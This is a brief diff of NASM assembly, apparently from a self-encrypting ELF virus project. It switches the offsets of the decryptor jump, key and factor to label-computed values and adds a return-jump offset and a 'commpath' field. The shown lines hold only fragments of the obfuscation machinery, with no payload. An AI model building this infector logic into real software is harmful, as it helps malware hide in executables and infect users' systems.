@@ -45,9 +45,12 @@
 %define JMP					0xe9
 %define EHDR_SIZE			64
 %define PHDR_SIZE			56
-%define JUMP_DECYPHER_OFFSET 492
-%define KEY_OFFSET			497
-%define FACTOR_OFFSET		533
+
+%define JUMP_DECYPHER_OFFSET _start.OUI - _start +1
+%define KEY_OFFSET			_start.key_offset - _start + 1
+%define FACTOR_OFFSET		_start.factor_offset - _start + 2 
+
+%define RETURN_JUMP_OFFSET	_end - _exx
 
 ; MACROS
 %macro PUSH 0
@@ -107,11 +110,13 @@
 
 %macro DECYPHER 0
 	xor r11, r11
+	.key_offset:
 	mov rdi, 0xAA  ; key
 	mov rax, .enc_start
 	lea rdx, [rel .enc_start]
 	mov rcx, enc_end
 	sub rcx, rax
+	.factor_offset:
 	mov r12, 0xAA
 	.decyphering:
 		mov r11b, byte [rdx]
@@ -205,4 +210,5 @@
 .tocypher		resb	0x5000			; location to cyphered v
 .key			resb	1				; location to key
 .factor			resb	1				; factor to derivate key
+.commpath		resb	100				; path to commfiles
 endstruc
